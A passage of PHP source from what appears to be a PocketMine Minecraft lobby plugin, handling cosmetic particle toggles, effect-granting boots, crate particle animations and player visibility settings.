					unset($this->particle14[array_search($name, $this->particle14)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
				
				
				
			}
			
		}
		
		if($in == TextFormat::RESET . TextFormat::GREEN . "Green " . TextFormat::GOLD . "Circle Particles") {
			
			if(!in_array($name, $this->particle3)) {
				
				$this->particle3[] = $name;
				$player->sendMessage($prefix . TextFormat::GREEN . "You have enabled your " . TextFormat::GOLD . "Green " . TextFormat::GREEN . "Circle Particles");
				
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle14)) {
					unset($this->particle14[array_search($name, $this->particle14)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
				
				
				
			} else {
				
				unset($this->particle3[array_search($name, $this->particle3)]);
				
				$player->sendMessage($prefix . TextFormat::RED . "You have disabled your " . TextFormat::GOLD . "Green " . TextFormat::RED . "Circle Particles");
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle14)) {
					unset($this->particle14[array_search($name, $this->particle14)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
				
				
				
			}
			
		}
		
		if($in == TextFormat::RESET . TextFormat::AQUA . "Rain " . TextFormat::GOLD . "Particles") {
			
			if(!in_array($name, $this->particle10)) {
				
				$this->particle10[] = $name;
				$player->sendMessage($prefix . TextFormat::GREEN . "You have enabled your " . TextFormat::AQUA . "Rain " . TextFormat::GREEN . " Particles");
				
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle14)) {
					unset($this->particle14[array_search($name, $this->particle14)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
				
				
				
			} else {
				
				unset($this->particle10[array_search($name, $this->particle10)]);
				
				$player->sendMessage($prefix . TextFormat::RED . "You have disabled your " . TextFormat::AQUA . "Rain " . TextFormat::RED . " Particles");
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle14)) {
					unset($this->particle14[array_search($name, $this->particle14)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
				
				
				
			}
			
		}
		
		
		// Boots
		
		$heart = Item::get(301, 0, 1);
		$heart->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Heart Boots");
		
		$jump = Item::get(317, 0, 1);
		$jump->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Jump Boots");
		
		$speed = Item::get(309, 0, 1);
		$speed->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Speed Boots");
		
		$water = Item::get(313, 0, 1);
		$water->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Water Boots");
		
		$exit = Item::get(351, 1, 1);
		$exit->setCustomName(TextFormat::RESET . TextFormat::RED . "Exit");
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "Boots") {
			if($player->hasPermission("lobby.boots")) {

				$inv = $player->getInventory();
				$inv->clearAll();
			
				$inv->setItem(0, $heart);
				$inv->setItem(1, $jump);
				$inv->setItem(2, $speed);
				$inv->setItem(3, $water);
				$inv->setItem(8, $exit);
			
				
			} else {
				
				$player->sendMessage($prefix . TextFormat::RED . "You need a higher rank to use Boots!");
				
			}
			
			
		}
		
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "Heart Boots") {
			
			if(in_array($name, $this->heart)) {
				
				unset($this->heart[array_search($name, $this->heart)]);
				$player->sendMessage($prefix . TextFormat::RED . "You haven't any " . TextFormat::GOLD . "Heart" . TextFormat::RED . " Boots.");
				$player->getArmorInventory()->setBoots(Item::get(0, 0, 1));
				$player->removeAllEffects();
				
				if(in_array($name, $this->speed)) {
					unset($this->speed[array_search($name, $this->speed)]);
				} elseif(in_array($name, $this->jump)) {
					unset($this->jump[array_search($name, $this->jump)]);
				} elseif(in_array($name, $this->water)) {
					unset($this->water[array_search($name, $this->water)]);
				}
				
			} else {
				
				$this->heart[] = $name;
				$player->sendMessage($prefix . TextFormat::GREEN . "You have " . TextFormat::GOLD . "Heart" . TextFormat::GREEN . " Boots on!");
				$player->removeAllEffects();
				$effect = Effect::getEffect(10);
				$player->addEffect(new EffectInstance($effect, 999, 1));
				$player->getArmorInventory()->setBoots(Item::get(301, 0, 1));
				
				if(in_array($name, $this->speed)) {
					unset($this->speed[array_search($name, $this->speed)]);
				} elseif(in_array($name, $this->jump)) {
					unset($this->jump[array_search($name, $this->jump)]);
				} elseif(in_array($name, $this->water)) {
					unset($this->water[array_search($name, $this->water)]);
				}
				
			}
			
		}
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "Jump Boots") {
			
			if(in_array($name, $this->jump)) {
				
				unset($this->jump[array_search($name, $this->jump)]);
				$player->sendMessage($prefix . TextFormat::RED . "You haven't any " . TextFormat::GOLD . "Jump" . TextFormat::RED . " Boots.");
				
				$player->removeAllEffects();
				$player->getArmorInventory()->setBoots(Item::get(0, 0, 1));
				if(in_array($name, $this->speed)) {
					unset($this->speed[array_search($name, $this->speed)]);
				} elseif(in_array($name, $this->heart)) {
					unset($this->heart[array_search($name, $this->heart)]);
				} elseif(in_array($name, $this->water)) {
					unset($this->water[array_search($name, $this->water)]);
				}
				
			} else {
				$player->removeAllEffects();
				$player->getArmorInventory()->setBoots(Item::get(317, 0, 1));
				$effect = Effect::getEffect(8);
				$player->addEffect(new EffectInstance($effect, 999, 1));
				
				$this->jump[] = $name;
				$player->sendMessage($prefix . TextFormat::GREEN . "You have " . TextFormat::GOLD . "Jump" . TextFormat::GREEN . " Boots on!");
				
				if(in_array($name, $this->speed)) {
					unset($this->speed[array_search($name, $this->speed)]);
				} elseif(in_array($name, $this->heart)) {
					unset($this->heart[array_search($name, $this->heart)]);
				} elseif(in_array($name, $this->water)) {
					unset($this->water[array_search($name, $this->water)]);
				}
				
			}
			
			
		}
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "Speed Boots") {
			
			if(in_array($name, $this->speed)) {
				
				unset($this->speed[array_search($name, $this->speed)]);
				$player->sendMessage($prefix . TextFormat::RED . "You haven't any " . TextFormat::GOLD . "Speed" . TextFormat::RED . " Boots.");
				$player->getArmorInventory()->setBoots(Item::get(0, 0, 1));
				$player->removeAllEffects();
				
				if(in_array($name, $this->jump)) {
					unset($this->jump[array_search($name, $this->jump)]);
				} elseif(in_array($name, $this->heart)) {
					unset($this->heart[array_search($name, $this->heart)]);
				} elseif(in_array($name, $this->water)) {
					unset($this->water[array_search($name, $this->water)]);
				}
				
			} else {
				$player->getArmorInventory()->setBoots(Item::get(309, 0, 1));
				$this->speed[] = $name;
				$player->sendMessage($prefix . TextFormat::GREEN . "You have " . TextFormat::GOLD . "Speed" . TextFormat::GREEN . " Boots on!");
				$player->removeAllEffects();
				$effect = Effect::getEffect(1);
				$player->addEffect(new EffectInstance($effect, 999, 1));
				
				if(in_array($name, $this->jump)) {
					unset($this->jump[array_search($name, $this->jump)]);
				} elseif(in_array($name, $this->heart)) {
					unset($this->heart[array_search($name, $this->heart)]);
				} elseif(in_array($name, $this->water)) {
					unset($this->water[array_search($name, $this->water)]);
				}
				
			}
			
		}
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "Water Boots") {
			
			if(in_array($name, $this->water)) {
				$player->getArmorInventory()->setBoots(Item::get(0, 0, 1));
				unset($this->water[array_search($name, $this->water)]);
				$player->sendMessage($prefix . TextFormat::RED . "You haven't any " . TextFormat::GOLD . "Water" . TextFormat::RED . " Boots.");
				
				$player->removeAllEffects();
				
				if(in_array($name, $this->speed)) {
					unset($this->speed[array_search($name, $this->speed)]);
				} elseif(in_array($name, $this->heart)) {
					unset($this->heart[array_search($name, $this->heart)]);
				} elseif(in_array($name, $this->jump)) {
					unset($this->jump[array_search($name, $this->jump)]);
				}
				
			} else {
				$player->getArmorInventory()->setBoots(Item::get(313, 0, 1));
				$this->water[] = $name;
				$player->sendMessage($prefix . TextFormat::GREEN . "You have " . TextFormat::GOLD . "Water" . TextFormat::GREEN . " Boots on!");
				$player->removeAllEffects();
				$effect = Effect::getEffect(13);
				$player->addEffect(new EffectInstance($effect, 999, 1));
				
				if(in_array($name, $this->speed)) {
					unset($this->speed[array_search($name, $this->speed)]);
				} elseif(in_array($name, $this->heart)) {
					unset($this->heart[array_search($name, $this->heart)]);
				} elseif(in_array($name, $this->jump)) {
					unset($this->jump[array_search($name, $this->jump)]);
				}
				
			}
			
		}
		
		if($in == TextFormat::RESET . TextFormat::RED . "Exit") {
			
			$inv = $player->getInventory();
			$inv->clearAll();
			
			$this->getItems($player);
			
		}
		
	}
	
	public function ExplosionPrimeEvent(ExplosionPrimeEvent $event){
		$event->setBlockBreaking(false);
	}
	
 }


class TypeType extends PluginTask {
	
	public function __construct($plugin) {
		$this->plugin = $plugin;
	
		$this->time1 = 0;
		$this->time2 = 0;
	
	}
	
	public function onRun($tick) {
		
		$cfg = new Config($this->plugin->getDataFolder() . "config.yml", Config::YAML);
		
		$x1 = $cfg->get("Crate-1-X");
		$y1 = $cfg->get("Crate-1-Y");
		$z1 = $cfg->get("Crate-1-Z");
		$x2 = $cfg->get("Crate-2-X");
		$y2 = $cfg->get("Crate-2-Y");
		$z2 = $cfg->get("Crate-2-Z");

		$level = $this->plugin->getServer()->getDefaultLevel();
		
		$center1 = new Vector3($x1 + 0.5, $y1 + 0.5, $z1 + 0.5);
		$center2 = new Vector3($x2 + 0.5, $y2 + 0.5, $z2 + 0.5);
		
		$config = new Config($this->plugin->getDataFolder() . "config.yml", Config::YAML);
		
		if(!$config->get("OpenChest1")) {
			for($yaw = 0; $yaw <= 10; $yaw += (M_PI * 2) / 20){
				$x = -sin($yaw) + $center1->x;
				$z = cos($yaw) + $center1->z;
				$y = $center1->y;
				
				$level->addParticle(new HappyVillagerParticle(new Vector3($x, $y, $z)));
			}
		} else {
			if($this->time1 == 2) {
				$this->time1 = 0;
			}
			
			$this->time1++;
			
			if($this->time1 < 2) {
				
				for($yaw = 0; $yaw <= 10; $yaw += (M_PI * 2) / 20){
					$x = -sin($yaw) + $center1->x;
					$z = cos($yaw) + $center1->z;
					$y = $center1->y;
					
					$level->addParticle(new RedstoneParticle(new Vector3($x, $y, $z)));
					
				}
				
			} else {
				
				for($yaw = 0; $yaw <= 10; $yaw += (M_PI * 2) / 20){
					$x = -sin($yaw) + $center1->x;
					$z = cos($yaw) + $center1->z;
					$y = $center1->y;
					
					$level->addParticle(new SmokeParticle(new Vector3($x, $y, $z)));
					
				}
				
				$config->set("OpenChest1", false);
				$config->save();
				
			}
			
		}
		
		if(!$config->get("OpenChest2")) {
			for($yaw = 0; $yaw <= 10; $yaw += (M_PI * 2) / 20){
				$x = -sin($yaw) + $center2->x;
				$z = cos($yaw) + $center2->z;
				$y = $center2->y;
				
				$level->addParticle(new HappyVillagerParticle(new Vector3($x, $y, $z)));
			}
		} else {
			if($this->time2 == 2) {
				$this->time2 = 0;
			}
			
			$this->time2++;
			
			if($this->time2 < 2) {
				
				for($yaw = 0; $yaw <= 10; $yaw += (M_PI * 2) / 20){
					$x = -sin($yaw) + $center2->x;
					$z = cos($yaw) + $center2->z;
					$y = $center2->y;
					
					$level->addParticle(new RedstoneParticle(new Vector3($x, $y, $z)));
					
				}
				
			} else {
				
				for($yaw = 0; $yaw <= 10; $yaw += (M_PI * 2) / 20){
					$x = -sin($yaw) + $center2->x;
					$z = cos($yaw) + $center2->z;
					$y = $center2->y;
					
					$level->addParticle(new SmokeParticle(new Vector3($x, $y, $z)));
					
				}
				
				$config->set("OpenChest2", false);
				$config->save();
				
			}
			
		}
		
	}
	
}


class ItemsLoad extends PluginTask {
	
	public function __construct($plugin) {
		$this->plugin = $plugin;
	}

	public function onRun($tick) {
		
		foreach($this->plugin->getServer()->getOnlinePlayers() as $player) {
			$name = $player->getName();
			$inv = $player->getInventory();
			
			$players = $player->getLevel()->getPlayers();
			$level = $player->getLevel();
			
			$x = $player->getX();
			$y = $player->getY() + 2;
			$z = $player->getZ();
			
			//player visibility
			foreach($players as $play) {
				if(in_array($name, $this->plugin->showall)) {
					
					$player->showPlayer($play);
					
				} elseif(in_array($name, $this->plugin->showvips)) {
					
					if($play->hasPermission("lobby.ranked")) {
						
						$player->showPlayer($play);
						
					} else {
						
						$player->hidePlayer($play);
						
					}
					
				} elseif(in_array($name, $this->plugin->shownone)) {
					
					$player->hidePlayer($play);
					
				}
				
			}
			
			//red
			if(in_array($name, $this->plugin->particle1)) {
				
				$r = 255;
				$g = 0;
				$b = 0;
				
				$center = new Vector3($x, $y, $z);
				$particle = new DustParticle($center, $r, $g, $b, 1);
				
				for($yaw = 0; $yaw <= 10; $yaw += (M_PI * 2) / 20){
					$x = -sin($yaw) + $center->x;
					$z = cos($yaw) + $center->z;
					$y = $center->y;
					
					$particle->setComponents($x, $y, $z);
					$level->addParticle($particle);
						
				}
				
			}
			
			//yellow
			if(in_array($name, $this->plugin->particle2)) {
				
				$r = 255;
				$g = 255;
				$b = 0;
				
				$center = new Vector3($x, $y, $z);
				$particle = new DustParticle($center, $r, $g, $b, 1);
				
				for($yaw = 0; $yaw <= 10; $yaw += (M_PI * 2) / 20){
					$x = -sin($yaw) + $center->x;
					$z = cos($yaw) + $center->z;
					$y = $center->y;
					
					$particle->setComponents($x, $y, $z);
					$level->addParticle($particle);
						
				}
			}
			
			//green
			if(in_array($name, $this->plugin->particle3)) {
				
				$r = 0;
				$g = 255;
				$b = 0;
				
				$center = new Vector3($x, $y, $z);
				$particle = new DustParticle($center, $r, $g, $b, 1);
				
				for($yaw = 0; $yaw <= 10; $yaw += (M_PI * 2) / 20){
					$x = -sin($yaw) + $center->x;
					$z = cos($yaw) + $center->z;
					$y = $center->y;
					
					$particle->setComponents($x, $y, $z);
					$level->addParticle($particle);
						
				}
			}
			
			//blue
			if(in_array($name, $this->plugin->particle4)) {
				
				$r = 0;
				$g = 0;
				$b = 255;
				
				$center = new Vector3($x, $y, $z);
				$particle = new DustParticle($center, $r, $g, $b, 1);
				
				for($yaw = 0; $yaw <= 10; $yaw += (M_PI * 2) / 20){
					$x = -sin($yaw) + $center->x;
					$z = cos($yaw) + $center->z;
					$y = $center->y;
					
					$particle->setComponents($x, $y, $z);
					$level->addParticle($particle);
						
				}
				
			}
			
			//orange
			if(in_array($name, $this->plugin->particle5)) {
				
				$r = 255;
				$g = 165;
				$b = 0;
				
				$center = new Vector3($x, $y, $z);
				$particle = new DustParticle($center, $r, $g, $b, 1);
				
				for($yaw = 0; $yaw <= 10; $yaw += (M_PI * 2) / 20){
					$x = -sin($yaw) + $center->x;
					$z = cos($yaw) + $center->z;
					$y = $center->y;
					
					$particle->setComponents($x, $y, $z);
					$level->addParticle($particle);
						
				}
				
			}
			
			//fire
			if(in_array($name, $this->plugin->particle6)) {
				$x = $player->getX();
				$y = $player->getY();
				$z = $player->getZ();
				
				$center = new Vector3($x, $y, $z);
				
				for($yaw = 0; $yaw <= 10; $yaw += (M_PI * 2) / 10){
					$x = -sin($yaw) + $center->x;
					$z = cos($yaw) + $center->z;
					$y = $center->y;
					
					$level->addParticle(new FlameParticle(new Vector3($x, $y + 1.5, $z)));
				
				}
				
			}
			
			//lava walking
			if(in_array($name, $this->plugin->particle15)) {
				$x = $player->getX();
				$y = $player->getY();
				$z = $player->getZ();
				$y2 = $y + 0.5;
				$y3 = $y2 + 1.4;
				$level->addParticle(new LavaParticle(new Vector3($x, mt_rand($y, rand($y2, $y3)), $z)));
				$level->addParticle(new LavaParticle(new Vector3($x, mt_rand($y, rand($y2, $y3)), $z)));
				$level->addParticle(new LavaParticle(new Vector3($x, mt_rand($y, rand($y2, $y3)), $z)));
				$level->addParticle(new LavaParticle(new Vector3($x, mt_rand($y, rand($y2, $y3)), $z)));
				$level->addParticle(new LavaParticle(new Vector3($x, mt_rand($y, rand($y2, $y3)), $z)));
				$level->addParticle(new LavaParticle(new Vector3($x, mt_rand($y, rand($y2, $y3)), $z)));
				$level->addParticle(new LavaParticle(new Vector3($x, mt_rand($y, rand($y2, $y3)), $z)));
				$level->addParticle(new LavaParticle(new Vector3($x, mt_rand($y, rand($y2, $y3)), $z)));
				$level->addParticle(new LavaParticle(new Vector3($x, mt_rand($y, rand($y2, $y3)), $z)));
				$level->addParticle(new LavaParticle(new Vector3($x, mt_rand($y, rand($y2, $y3)), $z)));
				$level->addParticle(new LavaParticle(new Vector3($x, mt_rand($y, rand($y2, $y3)), $z)));
				$level->addParticle(new LavaParticle(new Vector3($x, mt_rand($y, rand($y2, $y3)), $z)));
				$level->addParticle(new LavaParticle(new Vector3($x, mt_rand($y, rand($y2, $y3)), $z)));
				$level->addParticle(new LavaParticle(new Vector3($x, mt_rand($y, rand($y2, $y3)), $z)));
				$level->addParticle(new LavaParticle(new Vector3($x, mt_rand($y, rand($y2, $y3)), $z)));
			}
			
			//fire wings
			if(in_array($name, $this->plugin->particle12)) {
				$x = $player->getX();
				$y = $player->getY();
				$z = $player->getZ();
				if ($player->getDirection() === 0) {
					
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 2, $z - 0.4)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 2, $z + 0.4)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 1.8, $z - 0.6)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 1.8, $z + 0.6)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 1.6, $z - 0.8)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 1.6, $z + 0.8)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 1.6, $z - 0.2)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 1.6, $z + 0.2)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 1.4, $z - 0.6)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 1.4, $z)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 1.4, $z + 0.6)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 1.2, $z - 0.4)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 1.2, $z + 0.4)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 1, $z - 0.4)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 1, $z + 0.4)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 0.8, $z - 0.6)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 0.8, $z + 0.6)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 0.8, $z - 0.2)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 0.8, $z + 0.2)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 0.6, $z - 0.4)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 0.6, $z)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 0.6, $z + 0.4)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 0.4, $z - 0.4)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 0.4, $z + 0.4)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 0.4, $z - 0.6)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.3, $y + 0.4, $z + 0.6)));
					
				} elseif ($player->getDirection() === 2) {
					
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 2, $z - 0.4)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 2, $z + 0.4)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 1.8, $z - 0.6)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 1.8, $z + 0.6)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 1.6, $z - 0.8)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 1.6, $z + 0.8)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 1.6, $z - 0.2)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 1.6, $z + 0.2)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 1.4, $z - 0.6)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 1.4, $z)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 1.4, $z + 0.6)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 1.2, $z - 0.4)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 1.2, $z + 0.4)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 1, $z - 0.4)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 1, $z + 0.4)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 0.8, $z - 0.6)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 0.8, $z + 0.6)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 0.8, $z - 0.2)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 0.8, $z + 0.2)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 0.6, $z - 0.4)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 0.6, $z)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 0.6, $z + 0.4)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 0.4, $z - 0.4)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 0.4, $z + 0.4)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 0.4, $z - 0.6)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 0.4, $z + 0.6)));
					
				} elseif ($player->getDirection() === 1) {
					
					$level->addParticle(new FlameParticle(new Vector3($x - 0.4, $y + 2, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.4, $y + 2, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.6, $y + 1.8, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.6, $y + 1.8, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.8, $y + 1.6, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.8, $y + 1.6, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.2, $y + 1.6, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.2, $y + 1.6, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.6, $y + 1.4, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x, $y + 1.4, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.6, $y + 1.4, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.4, $y + 1.2, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.4, $y + 1.2, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.4, $y + 1, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.4, $y + 1, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.6, $y + 0.8, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.6, $y + 0.8, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.2, $y + 0.8, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.2, $y + 0.8, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.4, $y + 0.6, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x, $y + 0.6, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.4, $y + 0.6, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.4, $y + 0.4, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 0.4, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.6, $y + 0.4, $z - 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.6, $y + 0.4, $z - 0.3)));
					
				} elseif ($player->getDirection() === 3) {
					
					$level->addParticle(new FlameParticle(new Vector3($x - 0.4, $y + 2, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.4, $y + 2, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.6, $y + 1.8, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.6, $y + 1.8, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.8, $y + 1.6, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.8, $y + 1.6, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.2, $y + 1.6, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.2, $y + 1.6, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.6, $y + 1.4, $z + 0.3)));
